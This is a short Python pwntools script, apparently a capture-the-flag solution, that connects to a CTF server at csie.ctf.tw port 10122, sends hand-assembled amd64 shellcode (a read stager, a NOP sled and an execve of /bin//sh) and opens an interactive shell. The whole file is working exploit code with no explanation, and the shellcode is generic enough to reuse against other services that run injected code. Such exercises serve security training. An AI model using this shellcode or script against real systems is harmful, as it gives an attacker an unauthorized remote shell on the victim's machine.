#!/usr/bin/env python3

import pwn

rem = pwn.remote('csie.ctf.tw', 10122)
pwn.context.arch = 'amd64'
shellcode = pwn.asm('''
	xor rdi, rdi
	mov edx, 0x40
	syscall
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	xor rax, rax
	push rax
	mov rcx, 0x68732f2f6e69622f
	push rcx
	mov rdi, rsp
	push rax
	mov rdx, rsp
	push rdi
	mov rsi, rsp
	add rax, 59
	syscall
'''
)

rem.sendline(shellcode)
rem.interactive()
